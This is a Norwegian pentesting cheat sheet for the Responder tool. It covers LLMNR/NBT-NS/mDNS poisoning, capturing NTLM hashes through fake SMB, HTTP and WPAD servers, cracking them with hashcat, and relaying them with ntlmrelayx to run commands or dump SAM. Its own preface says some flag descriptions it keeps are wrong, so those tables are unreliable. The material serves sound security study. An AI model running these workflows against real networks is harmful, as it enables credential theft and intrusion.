# 🎣 Responder – forgiftning av LLMNR/NBT-NS

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

> **Presisering:** Materialet som fanges opp ved NTLM challenge–response, omtales ofte som NetNTLMv1/NetNTLMv2. Det er autentiseringsutvekslinger, ikke den rå NT-hashen som brukes direkte ved Pass-the-Hash. Relay betyr videresending av autentisering og avhenger av tjenestens beskyttelser og kontoens rettigheter. [Responder-dokumentasjonen](https://github.com/lgandx/Responder).
>
> **Rettelse til opprinnelige beskrivelser:** `--lm` aktiverer nedgradering til LM og tvinger ikke NTLMv2. `-d` gjelder DHCP-svar, ikke en generell DNS-aktivering. Disse opprinnelige eksemplene og tabellene er beholdt, men beskrivelsene må ikke brukes som en oppdatert flaggreferanse. [Offisiell alternativoversikt](https://github.com/lgandx/Responder#command-line-options).

```
  ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
  ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               Forgiftning av LLMNR/NBT-NS/mDNS
```

<p align="center">
  <img src="https://img.shields.io/badge/Responder-NTLM_Capture-red?style=for-the-badge" alt="Responder">
  <img src="https://img.shields.io/badge/LLMNR-Poisoning-blue?style=for-the-badge" alt="LLMNR">
</p>

---

## 📋 Innholdsfortegnelse

- [Hva er Responder](#-hva-er-responder)
- [Installasjon](#-installasjon)
- [Grunnleggende bruk](#-grunnleggende-bruk)
- [Fang opp NTLMv2-hasher](#-fang-opp-ntlmv2-hasher)
- [Relay-angrep](#-relay-angrep)
- [Falske servere](#-falske-servere)
- [Konfigurasjon](#-konfigurasjon)
- [Hurtigreferanse](#-hurtigreferanse)
- [Ressurser](#-ressurser)

---

## 🎯 Hva er Responder

**Responder** forfalsker LLMNR-, NBT-NS- og mDNS-svar for å fange opp NTLM-hasher:

- 🎣 **LLMNR-forgiftning** – Link-Local Multicast Name Resolution
- 📡 **NBT-NS-forgiftning** – NetBIOS Name Service
- 🍎 **mDNS-forgiftning** – Multicast DNS
- 🔓 **Hashinnsamling** – NTLMv1-/NTLMv2-hasher
- 🔄 **Relay-støtte** – NTLM relay-angrep

### Slik fungerer det

```
1. Brukeren skriver feil vertsnavn: \\fileservr (skrivefeil)
2. DNS-oppslaget mislykkes
3. Windows kringkaster en LLMNR/NBT-NS-forespørsel
4. Responder svarer: "I'm fileservr!"
5. Offeret sender NTLM-hash for å autentisere seg
6. Hashen fanges opp for knekking/relay
```

---

## 🚀 Installasjon

### Kali Linux

```bash
# Forhåndsinstallert
responder --help

# Oppdater
sudo apt update && sudo apt install responder

# Eller fra GitHub
git clone https://github.com/lgandx/Responder.git
cd Responder
python Responder.py --help
```

### Verifiser

```bash
responder --help
responder -I eth0 --version
```

---

## 💻 Grunnleggende bruk

### Start Responder

```bash
# Grunnleggende (fang opp hasher)
sudo responder -I eth0

# Detaljert utdata
sudo responder -I eth0 -v

# Analysemodus (passiv)
sudo responder -I eth0 -A
```

### Velge nettverksgrensesnitt

```bash
# Ethernet
sudo responder -I eth0

# Trådløst
sudo responder -I wlan0

# List nettverksgrensesnitt
ip a
```

---

## 🔓 Fang opp NTLMv2-hasher

### Grunnleggende innsamling

```bash
# Start Responder
sudo responder -I eth0

# Vent på ofre …
# Utdata:
[+] Listening for events...
[HTTP] NTLMv2 Client   : 192.168.1.100
[HTTP] NTLMv2 Username : DOMAIN\user
[HTTP] NTLMv2 Hash     : user::DOMAIN:1122334455667788:...
```

### Tving NTLMv2

```bash
# Bare NTLMv2 (anbefalt for knekking)
sudo responder -I eth0 --lm
```

### Innsamling via WPAD

```bash
# Aktiver WPAD-proxy
sudo responder -I eth0 -w

# Tving WPAD-autentisering
sudo responder -I eth0 -wF
```

### Plassering av hasher

```bash
# Innsamlede hasher lagres i:
/usr/share/responder/logs/
# Eller
./logs/

# Filer:
Responder-Session.log
SMB-NTLMv2-*.txt
HTTP-NTLMv2-*.txt
```

### Knekk innsamlede hasher

```bash
# NTLMv2-format:
# user::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response

# Hashcat (modus 5600)
hashcat -m 5600 hash.txt wordlist.txt

# John
john --format=netntlmv2 hash.txt
```

---

## 🔄 Relay-angrep

### Deaktiver SMB/HTTP (for relay)

```bash
# Rediger Responder.conf
sudo nano /usr/share/responder/Responder.conf

# Angi:
SMB = Off
HTTP = Off
```

### Responder + ntlmrelayx

```bash
# Terminal 1: Responder (uten SMB/HTTP)
sudo responder -I eth0

# Terminal 2: ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Eller med kommandokjøring
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

### Relay til LDAP

```bash
# Responder
sudo responder -I eth0

# Relay til LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local
```

### Relay for uthenting av SAM

```bash
# Hent ut SAM ved relay
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
```

---

<a id="-falske-servere"></a>
## 🖥️ Falske servere

### Innebygde servere

| Server | Port | Formål |
|--------|------|---------|
| SMB | 445 | Autentisering til fildelinger |
| HTTP | 80 | Nettautentisering |
| HTTPS | 443 | Sikker web |
| FTP | 21 | FTP-autentisering |
| SQL | 1433 | MSSQL-autentisering |
| LDAP | 389 | Katalogautentisering |
| WPAD | 80 | Proxykonfigurasjon |

### Aktiver/deaktiver servere

```bash
# Rediger Responder.conf
[Responder Core]
; Servere som skal startes
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

### Falsk WPAD-proxy

```bash
# Aktiver WPAD
sudo responder -I eth0 -w

# Tving Basic-autentisering på WPAD
sudo responder -I eth0 -wF

# Eget WPAD-skript
sudo responder -I eth0 -w --wpad-name wpad.dat
```

### DNS-forfalskning

```bash
# Aktiver DNS
sudo responder -I eth0 -d

# Responder blir DNS-server
# Svarer på oppslag for alle verter
```

---

<a id="-konfigurasjon"></a>
## ⚙️ Konfigurasjon

### Responder.conf

```bash
# Plassering
/usr/share/responder/Responder.conf
# Eller
./Responder.conf
```

### Viktige innstillinger

```ini
[Responder Core]
; Sett til On eller Off
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; Egen challenge-verdi (for regnbuetabeller)
Challenge = Random

; Ikke svar på lokale oppslag
DontRespondTo =

; Svar bare disse IP-adressene
RespondTo =
```

### Statisk challenge-verdi (regnbuetabeller)

```ini
; Angi statisk challenge-verdi for forhåndsberegnede tabeller
Challenge = 1122334455667788
```

### Unntak

```ini
; Ikke svar disse IP-adressene
DontRespondTo = 192.168.1.1, 192.168.1.2

; Svar bare disse
RespondTo = 192.168.1.100, 192.168.1.101
```

---

## 📊 Hurtigreferanse

### Viktige kommandoer

| Kommando | Beskrivelse |
|---------|-------------|
| `responder -I eth0` | Grunnleggende innsamling |
| `responder -I eth0 -v` | Detaljert modus |
| `responder -I eth0 -A` | Bare analyse |
| `responder -I eth0 -w` | Aktiver WPAD |
| `responder -I eth0 -wF` | Tving WPAD-autentisering |
| `responder -I eth0 -d` | Aktiver DNS |

### Flagg

| Flagg | Beskrivelse |
|------|-------------|
| `-I` | Nettverksgrensesnitt |
| `-v` | Detaljert utdata |
| `-A` | Analysemodus (passiv) |
| `-w` | Aktiver WPAD |
| `-wF` | Tving WPAD-autentisering |
| `-d` | Aktiver DNS |
| `-f` | Identifiser verter med fingeravtrykk |
| `-b` | Returner Basic-autentisering |

### Hashtyper

| Type | Hashcat-modus | John-format |
|------|--------------|-------------|
| NTLMv1 | 5500 | netntlm |
| NTLMv2 | 5600 | netntlmv2 |

### Angrepsarbeidsflyt

```bash
# 1. Start Responder
sudo responder -I eth0 -wFv

# 2. Vent på hasher
# Hasher lagres i ./logs/

# 3. Knekk hasher
hashcat -m 5600 ./logs/*NTLM*.txt rockyou.txt

# 4. Eller relay (deaktiver SMB først)
sudo responder -I eth0  # SMB=Off i konfigurasjonen
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### Arbeidsflyt for relay

```bash
# 1. Finn mål uten SMB-signering
cme smb 10.10.10.0/24 --gen-relay-list relay.txt

# 2. Konfigurer Responder.conf
# SMB = Off
# HTTP = Off

# 3. Start Responder
sudo responder -I eth0

# 4. Start relay
impacket-ntlmrelayx -tf relay.txt -smb2support

# 5. Vent på videresendt autentisering
```

---

## 📚 Ressurser

- [Responder GitHub](https://github.com/lgandx/Responder)
- [LLMNR-forgiftning](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
- [ntlmrelayx](https://github.com/fortra/impacket)

### Relaterte hurtigreferanser
- [Impacket](../../Impacket/translations/README.nb.md)
- [CrackMapExec](../../CrackMapExec/translations/README.nb.md)
- [Hashcat](../../Hashcat/translations/README.nb.md)

---

<p align="center">
  <b>🎣 Fang opp hashene!</b><br>
  <i>Responder – samler inn legitimasjon fra nettverket</i>
</p>
